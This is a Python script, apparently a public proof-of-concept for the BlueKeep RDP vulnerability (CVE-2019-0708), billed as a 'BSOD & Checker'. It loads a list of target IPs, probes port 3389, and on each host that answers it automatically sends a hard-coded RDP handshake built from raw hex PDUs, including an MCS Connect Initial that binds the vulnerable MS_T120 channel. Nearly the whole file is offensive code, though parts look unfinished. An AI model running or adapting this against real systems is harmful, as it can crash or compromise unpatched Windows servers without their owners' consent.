#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author :  #Bitwis3 - Hamid Mahmoud -
#Target OS: Windows Server 2008 r2

""" CVE-2019-0708 | Remote Desktop Services Remote Code Execution Vulnerability

A remote code execution vulnerability exists in Remote Desktop Services – formerly known as Terminal Services – when an unauthenticated attacker
connects to the target system using RDP and sends specially crafted requests.  This vulnerability  is pre-authentication  and  requires  no user
interaction.  An attacker who  successfully  exploited this  vulnerability could execute arbitrary code on the  target system. An attacker could
then  install programs; view, change, or delete data; or create new accounts with full user rights.

To exploit this vulnerability, an attacker would  need to send a specially  crafted request to the target systems Remote Desktop Service via RDP.
The update addresses the vulnerability by correcting how Remote Desktop Services handles connection requests.

#References:
- https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr
- https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708
- https://github.com/FreeRDP/FreeRDP
- https://github.com/citronneur/rdpy
- https://github.com/rdesktop/rdesktop
- https://github.com/SecureAuthCorp/impacket/

"""

import ssl
import binascii
import argparse
import sys
import socket
import requests
import struct
from OpenSSL import *
from impacket.structure import Structure

#Handling CommandLine Arguments
parser = argparse.ArgumentParser(description=' =: CVE-2019-0708 Options :=')
parser.add_argument('-f', '--file', help='list of IPs', dest='file')
parser.add_argument('-t', '--threads', help='Number of Threads',dest='threadnumbers', type=int, default=10)
parser.add_argument('-d', '--delay', help='Throttle between requests',dest='delay', type=int, default=10)
args = parser.parse_args()

#Parsing Arguments
IPs = str(args.file)
Threads = int(args.threadnumbers)
Throttle = int(args.delay)


#global Variables|Functions
gisRDP = [] # Validated RDP service List
gPort = 3389 
gChannel = 31
gSVC = "4d535f54313230"

TDPU_CONNECTION_REQUEST  = 0xe0
TPDU_CONNECTION_CONFIRM  = 0xd0
TDPU_DATA                = 0xf0
TPDU_REJECT              = 0x50
TPDU_DATA_ACK            = 0x60

# RDP_NEG_REQ constants
TYPE_RDP_NEG_REQ = 1
PROTOCOL_RDP     = 0
PROTOCOL_SSL     = 1
PROTOCOL_HYBRID  = 2

# RDP_NEG_RSP constants
TYPE_RDP_NEG_RSP = 2
EXTENDED_CLIENT_DATA_SUPPORTED = 1
DYNVC_GFX_PROTOCOL_SUPPORTED   = 2

# RDP_NEG_FAILURE constants
TYPE_RDP_NEG_FAILURE                  = 3
SSL_REQUIRED_BY_SERVER                = 1
SSL_NOT_ALLOWED_BY_SERVER             = 2
SSL_CERT_NOT_ON_SERVER                = 3
INCONSISTENT_FLAGS                    = 4
HYBRID_REQUIRED_BY_SERVER             = 5
SSL_WITH_USER_AUTH_REQUIRED_BY_SERVER = 6

#Colors
G = '\033[92m'  # green
Y = '\033[93m'  # yellow
B = '\033[94m'  # blue
R = '\033[91m'  # red
W = '\033[97m'  # white


#Initialization Class
"""
                                    Connection Sequence
     client                                                                    server
        |                                                                         |
        |-----------------------X.224 Connection Request PDU--------------------->|
        |<----------------------X.224 Connection Confirm PDU----------------------|
        |-------MCS Connect-Initial PDU with GCC Conference Create Request------->|
        |<-----MCS Connect-Response PDU with GCC Conference Create Response-------|
        |------------------------MCS Erect Domain Request PDU-------------------->|
        |------------------------MCS Attach User Request PDU--------------------->|
        |<-----------------------MCS Attach User Confirm PDU----------------------|
        |------------------------MCS Channel Join Request PDU-------------------->|
        |<-----------------------MCS Channel Join Confirm PDU---------------------|
        |----------------------------Security Exchange PDU----------------------->|
        |-------------------------------Client Info PDU-------------------------->|
        |<---------------------License Error PDU - Valid Client-------------------|
        |<-----------------------------Demand Active PDU--------------------------|
        |------------------------------Confirm Active PDU------------------------>|
        |-------------------------------Synchronize PDU-------------------------->|
        |---------------------------Control PDU - Cooperate---------------------->|
        |------------------------Control PDU - Request Control------------------->|
        |--------------------------Persistent Key List PDU(s)-------------------->|
        |--------------------------------Font List PDU--------------------------->|
        |<------------------------------Synchronize PDU---------------------------|
        |<--------------------------Control PDU - Cooperate-----------------------|
        |<-----------------------Control PDU - Granted Control--------------------|
        |<-------------------------------Font Map PDU-----------------------------|
"""
class Connection_Sequence:

    @staticmethod
    def Connection_Request_PDU():
         
         """03 -> TPKT Header: version = 3
         00 -> TPKT Header: Reserved = 0
         00 -> TPKT Header: Packet length - high part
         2c -> TPKT Header: Packet length - low part (total = 44 bytes)    
         27 -> X.224: Length indicator (39 bytes)                           
         e0 -> X.224: Type (high nibble) = 0xe = CR TPDU; credit (low nibble) = 0
         00 00 -> X.224: Destination reference = 0
         00 00 -> X.224: Source reference = 0
         00 -> X.224: Class and options = 0""" 
         CR_PDU = '030000130ee000000000000100080003000000'
         CR_PDU_Unpacked = Common.gUnpack(CR_PDU)
         return(CR_PDU_Unpacked)
    
    @staticmethod
    def Erect_Domain_Request_PDU():
        """
        03 00 00 0c -> TPKT Header (length = 12 bytes)
        02 f0 80 -> X.224 Data TPDU
        """
        ErectPDU = '0300000c02f0800400010001'
        # ErectPDU = '0300000c02f0800401000100'
        ErectPDU_Unpacked = Common.gUnpack(ErectPDU)
        return(ErectPDU_Unpacked)

    @staticmethod
    def MCS_Attach_User_Request_PDU():
        """
         03 00 00 08 -> TPKT Header (length = 8 bytes)
         02 f0 80 -> X.224 Data TPDU
         28 -> PER encoded (ALIGNED variant of BASIC-PER) PDU contents:
        """
        MCSUser = '0300000802f08028'
        MCSUser_Unpacked = Common.gUnpack(MCSUser)
        return(MCSUser_Unpacked)

    @staticmethod
    def MCS_Connect_Initial_PDU( Build = '280a0000' ):
        
        global gSVC

        """
         03 -> TPKT: TPKT version = 3
         00 -> TPKT: Reserved = 0
         01 -> TPKT: Packet length - high part
         a0 -> TPKT: Packet length - low part (total = 416 bytes)
         02 -> X.224: Length indicator = 2
         f0 -> X.224: Type = 0xf0 = Data TPDU
         80 -> X.224: EOT
            
         7f 65 -> BER: Application-Defined Type = APPLICATION 101 = Connect-Initial
         ... and so forth
        """
        Old_Init_ = '030001ee02f0807f658201e20401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff02010204820181000500147c00018178000800100001c00044756361816a01c0ea000a0008008007380401ca03aa09040000b11d00004400450053004b0054004f0050002d004600380034003000470049004b00000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f00af07620063003700380065006600360033002d0039006400330033002d003400310039380038002d0039003200630066002d0000310062003200640061004242424207000100000056020000500100000000640000006400000004c00c00150000000000000002c00c001b0000000000000003c0680005000000726470736e6400000f0000c0636c6970726472000000a0c0647264796e766300000080c04d535f5431323000000000004d535f5431323000000000004d535f5431323000000000004d535f5431323000000000004d535f543132300000000000'
        # Init_  = '030001ca02f0807f658201be0401010401010101ff' #458
        # Init_ += '30200202002202020002020200000202000102020000020200010202ffff02020002302002020001020200010202000102020001020200000202000102020420020200023020' 
        # Init_ += '0202ffff0202fc170202ffff0202000102020000020200010202ffff020200020'
        # Init_ += '482014b000500147c00018142000800100001c000447563618134' # 331
        # Init_ += '01c0d800' #216
        # Init_ += '040008002003580201ca03aa09040000' 
        # Init_ +=  Build # B11D0000 = 7601 Windows Server 2008 r2 
        # Init_ += '7800310038003100300000000000000000000000000000000000000000000000' #CLIENT
        # Init_ += '04000000000000000c000000'
        # Init_ += '00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
        # Init_ += '01ca01000000000018000700'
        # Init_ += '010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'
        # Init_ += '00000000000004c00c000900000000000000'
        # Init_ += '02c00c000300000000000000'
        # Init_ += '03c0440005000000' #Length 
        # Init_ += '636c697072647200c0a000004d535f543132300080800000726470736e640000c0000000736e646462670000c0000000726470647200000080800000'
        
        #print(Init_)
        InitPDU_Unpacked = Common.gUnpack(Old_Init_)
        return(InitPDU_Unpacked)

    @staticmethod
    def Client_Info_PDU():
        """
        03 00 01 ab -> TPKT Header (length = 427 bytes)
        02 f0 80 -> X.224 Data TPDU
        ... 
        """
        ClientPDU = '0300016102f08064000703eb7081524000a1a509040904bb47030000000e00080000000000000042007200770041006600660079000000740074007400740000000000000002001c00310030002e0030002e0030002e003700360000000000000000000000400043003a005c00570049004e0044004f00570053005c00730079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004d006f0075006e007400610069006e0020005300740061006e0064006100720064002000540069006d006500000000000000000000000000000000000000000000000b00000001000200000000000000000000004d006f0075006e007400610069006e0020004400610079006c0069006700680074002000540069006d006500000000000000000000000000000000000000000000000300000002000200000000000000c4ffffff0100000006000000000064000000'
        ClientPDU_Unpacked = Common.gUnpack(ClientPDU)
        return(ClientPDU_Unpacked)
    
    @staticmethod
    def Client_Confirm_Active_PDU():
        """
        03 00 02 07 -> TPKT Header (length = 519 bytes)
        02 f0 80 -> X.224 Data TPDU
        ...
        """
        ClientActivePDU = '0300026302f08064000703eb70825454021300f003ea030100ea0306003e024d53545343001700000001001800010003000002000000001d04000000000000000002001c00200001000100010080073804000001000100001a0100000003005800000000000000000000000000000000000000000001001400000001000000aa000101010101000001010100010000000101010101010101000101010000000000a1060600000000000084030000000000e404000013002800030000037800000078000000fc09008000000000000000000000000000000000000000000a0008000600000007000c00000000000000000005000c00000000000200020008000a0001001400150009000800000000000d005800910020000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe0000014000000800010001030000000f0008000100000011000c00010000000028640014000c00010000000000000015000c0002000000000a00011a000800af9400001c000c0012000000000000001b00060001001e0008000100000018000b0002000000030c001d005f0002b91b8dca0f004f15589fae2d1a87e2d6010300010103d4cc44278a9d744e803c0ecbeea19c54053100310000000100000025000000c0cb080000000100c1cb1d00000001c0cf0200080000014000020101010001400002010104'
        ClientActivePDU_Unpacked = Common.gUnpack(ClientActivePDU)
        return(ClientActivePDU_Unpacked)
    
    @staticmethod
    def Client_Control_Request_PDU():
        """
        03 00 00 34 -> TPKT Header (length = 52 bytes)
        02 f0 80 -> X.224 Data TPDU
        ...
        """
        ClientControlPDU = '0300003402f08064000603eb7026080081f83b8bb47256ffd1d64b171eaef68ddd75a0a316972912b7cf14c9110bd8c8faa1813a'
        ClientControlPDU_Unpacked = Common.gUnpack(ClientControlPDU)
        return(ClientControlPDU_Unpacked)

    @staticmethod
    def Client_Control_Cooperate_PDU():
        """
        03 00 00 34 -> TPKT Header (length = 52 bytes)
        02 f0 80 -> X.224 Data TPDU
        ...
        """
        ClientControlCooperatePDU = '0300003402f08064000603eb7026080081f80403def791a37caf3f7a624e3bfeb67a28bf0d4f312703b94af1e626f0bdc5710a53'
        ClientControlCooperatePDU_Unpacked = Common.gUnpack(ClientControlCooperatePDU)
        return(ClientControlCooperatePDU_Unpacked)

    @staticmethod
    def Client_Persistent_Key_List_PDU():
        """
        03 00 01 0d -> TPKT Header (length = 269 bytes)
        02 f0 80 -> X.224 Data TPDU
        ...
        """
        ClientPersistentKeyPDU = '0300010d02f08064000603eb7080fe08009016cec64a69d9d3499e10a5040fcfab4f6a3bda31034f29bd643e9846ec0a1dcd9cad1358a3bd8b9daef1e99d439653f5d0b75088f381f1cbad1755759c5fefeca93540b37406d1aed1159fed9149a63d1fc131b11758da0e24df1f878639d14666ea0e98d04b5b7b01b98ae8683280dab958a69f4fb5ba7904aed963c06aa8815197250b3fc3d247fa0a7a221fbd5f4eb800ea3206e6af15e46fb3d3c14ccb0a8edda729070359c1c1081baa563cf5d089e3cdcf268b65590acb7e81b633bb4d9a1380e7572a0d1d11b418c4312f4f897709942ec38ebffd6a392b47740e1274ec4514c36b27d6b69311a4bc46de694ab454c72424998f60b72159'
        ClientPersistentKeyPDU_Unpacked = Common.gUnpack(ClientPersistentKeyPDU)
        return(ClientPersistentKeyPDU_Unpacked)

    @staticmethod
    def Client_Font_List_PDU():
        """
        03 00 00 34 -> TPKT Header (length = 52 bytes)
        02 f0 80 -> X.224 Data TPDU
        ...
        """
        ClientFontListPDU = '0300003402f08064000603eb7026080080fe98195cfb9292f59718b2b7c313dc03fb6445c0436d913726fd8e71e6f22a1eae3503'
        ClientFontListPDU_Unpacked = Common.gUnpack(ClientFontListPDU)
        return(ClientFontListPDU_Unpacked)

    @staticmethod
    def Client_Join_Request_PDU(size = 30,pad = False):
        """
         #Example 1006
         ChannelJoinRequest::initiator = 6 + 1001 = 1007
         ChannelJoinRequest::channelId = 0x03ee = 1006
        """
        channel = [
            1003,
            1004,
            1005,
            1006,
            1007,
            1008,
            1009
        ]

        dep_Req = '0300000c02f080380006'
        Req = '0300000c02f080380008'
        MS_T120 = '4d535f5431323000000000'
        Padding = '41' * size
        PDUChannels = []
        res = ""
        if pad:
            exp = dep_Req+MS_T120+Padding
            res = Common.gUnpack(exp)
        else:
            for channelID in channel:
                iChannel = Req + hex(channelID)[2:].zfill(4)
                PDUChannels.append(Common.gUnpack(iChannel))
            res = PDUChannels
        return res    
    
    @staticmethod
    def Client_Security_Exchange_PDU():
        """ 
        03 00 00 5e -> TPKT Header (length = 94 bytes)
        02 f0 80 -> X.224 Data TPDU
        
        PER encoded (ALIGNED variant of BASIC-PER) SendDataRequest PDU:
        64 00 06 03 eb 70 50
        ..."""
        SecurityExchangePDU = '0300005e02f08064000603eb7050010200004800000091ac0c8f648c39f4e7ff0a3b79115c13512acb728f9db7422ef7084c8eae559962d28181e466c805ead473063fc85faf2afdfcf164b33f0a151ddb2c109d30110000000000000000'
        SecurityExchangePDU_Unpacked = Common.gUnpack(SecurityExchangePDU)
        return(SecurityExchangePDU_Unpacked)

    @staticmethod
    def Client_Synchronize_PDU():
        """ 
        03 00 00 30 -> TPKT Header (length = 48 bytes)
        02 f0 80 -> X.224 Data TPDU
        
        64 00 06 03 eb 70 22 -> PER encoded (ALIGNED variant of BASIC-PER) SendDataRequest

        ..."""
        ClientSynchronizePDU = '0300003002f08064000603eb7022280081f859ffcb2f73572b42db882e23a997c2b1f574bc49cc8ad8fd608a7af64475'
        ClientSynchronizePDU_Unpacked = Common.gUnpack(ClientSynchronizePDU)
        return(ClientSynchronizePDU_Unpacked)


    
""" Performing Common Funcionalities """
class Common():

    """" Print The Banner """
    @staticmethod
    def PrintBanner():
        print("""%s

        ██████╗██╗   ██╗███████╗    ██████╗  ██████╗  ██╗ █████╗        ██████╗ ███████╗ ██████╗  █████╗ 
        ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗███║██╔══██╗      ██╔═████╗╚════██║██╔═████╗██╔══██╗
        ██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║╚██║╚██████║█████╗██║██╔██║    ██╔╝██║██╔██║╚█████╔╝
        ██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║ ██║ ╚═══██║╚════╝████╔╝██║   ██╔╝ ████╔╝██║██╔══██╗
        ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝ ██║ █████╔╝      ╚██████╔╝   ██║  ╚██████╔╝╚█████╔╝
        ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝  ╚═╝ ╚════╝        ╚═════╝    ╚═╝   ╚═════╝  ╚════╝ 
                                                                                                  
                                                                     %s%s
                            # Developed by Bitwis3
                        # CVE-2019-0708 BSOD & Checker
    """ % (W, W, G))


    """ Send & Recieve Packet"""
    @staticmethod
    def SockSenRec(Obj,IP,Port = 3389):
        try:
             mSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             mSock.connect((IP,Port))
             mSock.sendall(Obj)
        except Exception as e:
            pass
        return(mSock.recv(4000))

    """" Check Targets """
    @staticmethod
    def CheckFile():
        print(Y+"["+R+"+"+Y+"] Targets were Loaded"+G)
        print(Y+"["+R+"*"+Y+"] Start Checking, Please Wait.\n"+G)
        global IPs
        Targets = open(IPs,'r')
        for target in Targets:
            Common.CheckService(str(target).strip())

    """ Unpack """
    @staticmethod
    def gUnpack(Obj):
        return(binascii.unhexlify(Obj))

    """ pack """
    @staticmethod
    def gPack(Obj):
        return(binascii.hexlify(Obj))
      
    """ Check if the RDP service is running or not"""
    @staticmethod
    def CheckService(IP):
        global gisRDP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP,3389))
            rdpCorrelationInfo  = Common.gUnpack("436f6f6b69653a206d737473686173683d75736572300d0a010008000100000000")
            test_packet = Connection_Sequence.Connection_Request_PDU()
            test_packet_bin = test_packet + rdpCorrelationInfo
            # test_packet = \x03\x00\x00,'\xe0\x00\x00\x00\x00\x00Cookie: mstshash=user0\r\n\x01\x00\x08\x00\x01\x00\x00\x00\x00
            s.sendall(test_packet_bin)
            res = s.recv(9216)
            # Confirm packet from the server would be like \x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x01\x08\x00\x01\x00\x00\x00
            if(res):
                print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] Connected to The RDP Service! \n"+G)
                gisRDP.append(IP)
                Common.AttackRDP(IP)
        except Exception as e:
            pass
        
    """ Exploiting/Checking """
    @staticmethod
    def AttackRDP(IP):

        tpkt = TPKT()
        tpdu = TPDU()
        rdp_neg = RDP_NEG_REQ()
        rdp_neg['Type'] = TYPE_RDP_NEG_REQ
        rdp_neg['requestedProtocols'] = PROTOCOL_SSL
        tpdu['VariablePart'] = rdp_neg.getData()
        
        tpdu['Code'] = TDPU_CONNECTION_REQUEST
        tpkt['TPDU'] = tpdu.getData()
        
        s = socket.socket()
        s.connect((IP,3389))

        s.sendall(tpkt.getData())
        s.recv(1024)
        
        ctx = SSL.Context(SSL.TLSv1_METHOD)
        tls = SSL.Connection(ctx,s)
        tls.set_connect_state()
        tls.do_handshake()


        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client MCS Connect Initial PDU with GCC! "+G)
        tls.sendall(Connection_Sequence.MCS_Connect_Initial_PDU())
        r_packet = tls.recv(8000)
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"]"+B+" -> Received "+str(hex((len(r_packet))))+" Bytes "+G)
        
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client MCS Erect Domain Request PDU! "+G)
        tls.sendall(Connection_Sequence.Erect_Domain_Request_PDU())
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client MCS Attach User Request PDU! "+G)
        tls.sendall(Connection_Sequence.MCS_Attach_User_Request_PDU())
        r_packet = tls.recv(8000) 
        # print('User::::',Common.gPack(r_packet))
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"]"+B+" -> Received "+str(hex((len(r_packet))))+" Bytes "+G)
        
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending MCS Channel Join Request and Confirm PDUs! "+G)
        for pdu in Connection_Sequence.Client_Join_Request_PDU():
           tls.sendall(pdu)
           ch = int(Common.gPack(pdu)[-4:],16)
           r_packet = tls.recv(1024)
        #    print(Common.gPack(r_packet))
           print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"]"+B+" -> Received "+str((hex(len(r_packet))))+" Bytes on Channel ["+W+str(ch)+B+"] "+G)
        
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client Security Exchange PDU! "+G)
        tls.sendall(Connection_Sequence.Client_Security_Exchange_PDU())
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client Info PDU! "+G)
        tls.sendall(Connection_Sequence.Client_Info_PDU())
        r_packet = tls.recv(8000)
        # print(Common.gPack(r_packet))
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"]"+B+" -> Received "+str(hex((len(r_packet))))+" Bytes "+G)
        r_packet = tls.recv(8000)
        # print(Common.gPack(r_packet))
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"]"+B+" -> Received "+str(hex((len(r_packet))))+" Bytes "+G)
        r_packet = tls.recv(8000)
        # print(Common.gPack(r_packet))
        # print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"]"+B+" -> Received "+str(hex((len(r_packet))))+" Bytes "+G)
        
        tls.sendall(Common.gUnpack('0300026302f08064000703eb70825454021300f003ea030100ea0306003e024d53545343001700000001001800010003000002000000001d04000000000000000002001c00200001000100010080073804000001000100001a0100000003005800000000000000000000000000000000000000000001001400000001000000aa000101010101000001010100010000000101010101010101000101010000000000a1060600000000000084030000000000e404000013002800030000037800000078000000fc09008000000000000000000000000000000000000000000a0008000600000007000c00000000000000000005000c00000000000200020008000a0001001400150009000800000000000d005800910020000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe0000014000000800010001030000000f0008000100000011000c00010000000028640014000c00010000000000000015000c0002000000000a00011a000800af9400001c000c0012000000000000001b00060001001e0008000100000018000b0002000000030c001d005f0002b91b8dca0f004f15589fae2d1a87e2d6010300010103d4cc44278a9d744e803c0ecbeea19c54053100310000000100000025000000c0cb080000000100c1cb1d00000001c0cf0200080000014000020101010001400002010104'))
        # r_packet = tls.recv(1000)
        # print(Common.gPack(r_packet))


        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client Confirm Active PDU! "+G)
        tls.sendall(Connection_Sequence.Client_Confirm_Active_PDU())
        r_packet = tls.recv(1024)
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"]"+B+" -> Received "+str(hex(len(r_packet)))+" Bytes "+G)


        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client Synchronize PDU! "+G)
        tls.sendall(Connection_Sequence.Client_Synchronize_PDU())
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client Control Cooperate PDU! "+G)
        tls.sendall(Connection_Sequence.Client_Control_Cooperate_PDU())
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client Control Request PDU! "+G)
        tls.sendall(Connection_Sequence.Client_Control_Request_PDU())
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client Persistent Key List PDU! "+G)
        tls.sendall(Connection_Sequence.Client_Persistent_Key_List_PDU())
        print(Y+"["+G+"+"+Y+"] HOST ["+G+str(IP).strip()+Y+"] -> Sending Client Font List PDU! "+G)
        tls.sendall(Connection_Sequence.Client_Font_List_PDU())
        r_packet = tls.recv(8000)
        print(Common.gPack(r_packet))
        r_packet = tls.recv(8000)
        
        
        # tls.sendall(Common.gUnpack('0300026302f08064000703eb70825454021300f003ea030100ea0306003e024d53545343001700000001001800010003000002000000001d04000000000000000002001c00200001000100010080073804000001000100001a0100000003005800000000000000000000000000000000000000000001001400000001000000aa000101010101000001010100010000000101010101010101000101010000000000a1060600000000000084030000000000e404000013002800030000037800000078000000fc09008000000000000000000000000000000000000000000a0008000600000007000c00000000000000000005000c00000000000200020008000a0001001400150009000800000000000d005800910020000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe0000014000000800010001030000000f0008000100000011000c00010000000028640014000c00010000000000000015000c0002000000000a00011a000800af9400001c000c0012000000000000001b00060001001e0008000100000018000b0002000000030c001d005f0002b91b8dca0f004f15589fae2d1a87e2d6010300010103d4cc44278a9d744e803c0ecbeea19c54053100310000000100000025000000c0cb080000000100c1cb1d00000001c0cf0200080000014000020101010001400002010104'))
        # r_packet = tls.recv(8000)
        # print(Common.gPack(r_packet))
      



 # Impacket Clasess        
class TPKT(Structure):
    commonHdr = (
        ('Version','B=3'),
        ('Reserved','B=0'),
        ('Length','>H=len(TPDU)+4'),
        ('_TPDU','_-TPDU','self["Length"]-4'),
        ('TPDU',':=""'),
    )

class TPDU(Structure):
    commonHdr = (
        ('LengthIndicator','B=len(VariablePart)+1'),
        ('Code','B=0'),
        ('VariablePart',':=""'),
    )

    def __init__(self, data = None):
        Structure.__init__(self,data)
        self['VariablePart']=''

class CR_TPDU(Structure):
    commonHdr = (
        ('DST-REF','<H=0'),
        ('SRC-REF','<H=0'),
        ('CLASS-OPTION','B=0'),
        ('Type','B=0'),
        ('Flags','B=0'),
        ('Length','<H=8'),
    )

class DATA_TPDU(Structure):
    commonHdr = (
        ('EOT','B=0x80'),
        ('UserData',':=""'),
    )

    def __init__(self, data = None):
        Structure.__init__(self,data)
        self['UserData'] =''


class RDP_NEG_REQ(CR_TPDU):
    structure = (
        ('requestedProtocols','<L'),
    )
    def __init__(self,data=None):
        CR_TPDU.__init__(self,data)
        if data is None:
            self['Type'] = 1



        

if __name__ == '__main__':
    Common.PrintBanner()
    Common.CheckFile()
    
